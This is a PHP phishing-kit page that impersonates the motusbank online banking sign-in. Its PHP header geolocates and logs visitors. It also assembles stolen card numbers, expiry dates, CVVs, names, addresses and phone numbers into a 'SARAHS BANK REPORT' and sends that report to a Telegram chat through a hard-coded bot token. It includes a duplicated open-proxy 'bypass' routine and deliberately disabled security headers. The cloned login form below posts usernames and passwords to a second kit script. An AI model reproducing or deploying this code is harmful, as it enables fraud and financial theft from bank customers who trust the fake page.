<?php
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "MORE OF THIS CASH [MOTUS]";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data),
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
    )
);
$context  = stream_context_create($options);
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage", false, $context);

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

?>
     
<html class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Login - motusbank</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <meta name="description" content="motusbank online banking">
        <meta name="keywords" content="motusbank, online, banking">
        <meta name="format-detection" content="telephone=no">
        <!--<base href="https://banking.motusbank.ca/">--><base href=".">
        <link href="files/mint.css" id="theme-stylesheet" rel="stylesheet">
        <script src="files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>var lrbank = 'Motus'; var lrinfo = 'Login';</script>
        <script src="files/actions"></script>
    </head>
    <body>
        <div class="header-container">
            <div class="row public-header">
                <div class="logo-container">
                    <a href="https://banking.motusbank.ca/Security_Login">
                    <img src="files/logo.svg" alt="motusbank Logo" class="motusbank-logo">
                    </a>
                </div>
                <div class="link-container">
                    <ul class="utility-links">
                        <li>
                            <a href="https://www.motusbank.ca/" class="underlined" target="_blank">motusbank.ca</a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div id="page-content" class="signin-page" style="background-image: url(https://banking.motusbank.ca/Content/Images/Banners/Retail_SignInBackground_All.jpg)">
            <div class="signin-page-inner">
                <div class="row">
                    <div class="signin-form-container">
                        <div class="signin-form">
                            <h1>Online Banking Sign In</h1>
                            <form action="MOT_2.php" autocomplete="false" method="post" novalidate="novalidate">
                                <div data-memorized-account-hidden="" style="" class="signin-form-content">
                                    <label>Email or Member Number</label>
                                    <input value="" class="textbox lrinput" attr-action="Filling Username" data-msg-maxlength="Email or Member Number cannot be longer than 320 characters." data-msg-required="Email or Member Number is required." focus="" id="CustNo" maxlength="320" name="username" placeholder="Enter Email or Member Number" required="required" type="text">
                                    <input type="hidden" name="CRSFToken" value="">
                                </div>
                                <div class="signin-form-content">
                                    <label>Password</label>
                                    <input autocomplete="off" class="textbox " data-msg-maxlength="Password cannot be more than 12 characters" data-msg-required="Password is required." id="pwd" maxlength="12" name="password" placeholder="Enter Password" required="required" type="password" autocapitalize="none" attr-action="Filling Password">
                                    <div>
                                        <span class="caps-lock-warning">Caps lock is enabled</span>
                                    </div>
                                </div>
                                <label data-memorized-account-hidden="" style="" class="normal">
                                <label data-type="checkbox" class="wrapped-toggle remember-me-checkbox primary"><input class="remember-me-checkbox primary" id="RememberMe" name="RememberMe" type="checkbox" value="true"></label><input name="RememberMe" type="hidden" value="false">
                                Remember Account
                                </label>
                                <div class="signin-form-content" data-remember-shown="" style="display: none;">
                                    <input id="RememberMeNickname" name="RememberMeNickname" placeholder="Nickname (Optional)" type="text" value="">
                                </div>
                                <div class="signin-form-content">
                                    <button type="submit" name="save" value="1" class="white button" id="sign-in-button">
                                    Sign In
                                    </button>
                                </div>
                                <div class="signin-form-content">
                                    <p>Not a member? <a href="https://www.motusbank.ca/join" class="decorated" id="join-now-link" target="_blank">Join Now</a></p>
                                </div>
                                <div class="signin-form-content recaptcha-tos">
                                    This site is protected by reCAPTCHA and the Google <a target="_blank" href="https://policies.google.com/privacy" class="decorated">Privacy Policy</a> and <a target="_blank" href="https://policies.google.com/terms" class="decorated">Terms of Service</a> apply.
                                </div>
                            </form>
                        </div>
                        <div class="signin-form-links">
                            <a href="https://banking.motusbank.ca/Security_Contact">Contact Us</a> |
                            <a href="https://banking.motusbank.ca/Security_FAQ">FAQs</a> |
                            <a href="https://banking.motusbank.ca/Security_Difficulty">Need Help Signing In?</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="main-footer">
            <div class="footer-spiral-container">
                <img class="footer-spiral visible" src="files/Spiral-1.svg" style="animation-delay: -92.1562s;">
            </div>
            <div class="row">
                <div class="logo-container">
                    <a href="https://banking.motusbank.ca/Security_Login">
                    <img src="files/logo.svg" alt="Motusbank Logo" class="motusbank-logo">
                    </a>
                </div>
                <div class="footer-sub">
                    <span>Copyright © 2021 Motus Bank. All rights reserved.</span>
                    <a href="https://banking.motusbank.ca/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                    <ul class="footer-links">
                        <li><a href="https://www.motusbank.ca/agreement-privacy" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a></li>
                        <li><a href="https://www.motusbank.ca/legal" title="Legal" target="_blank">Legal</a></li>
                        <li><a href="https://www.motusbank.ca/accessibility" title="Accessibility" target="_blank">Accessibility</a></li>
                    </ul>
                </div>
            </div>
        </footer>
    

</body></html></html></html></html>